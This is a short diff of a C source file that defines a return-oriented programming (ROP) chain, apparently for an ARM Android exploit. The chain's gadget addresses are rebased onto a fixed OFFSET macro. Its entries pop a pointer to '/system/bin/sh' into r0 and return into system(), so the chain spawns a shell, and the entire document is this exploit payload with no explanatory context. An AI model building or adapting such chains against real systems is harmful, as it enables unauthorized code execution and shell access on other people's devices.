@@ -1,13 +1,15 @@
 #include <unistd.h>
 #include <stdlib.h>
 
+#define OFFSET 0x40002000
+
 unsigned long rop[] = { 
-  0x4001a9db,  	// pop	{r4, pc}
-  0x4003cd3a,  	// "/system/bin/sh"
-  0x4001a9d9,  	// mov	r0, r4
- 		// pop  {r4, pc}
+  OFFSET + 0x000189db,  	// pop	{r4, pc}
+  OFFSET + 0x0003ad3a,  	// "/system/bin/sh"
+  OFFSET + 0x000189d9,  	// mov	r0, r4
+ 				// pop  {r4, pc}
   0xcccccccc,
-  0x4001c3a5,	// system()
+  OFFSET + 0x0001a3a5,		// system(const char *)
   0
 };
   
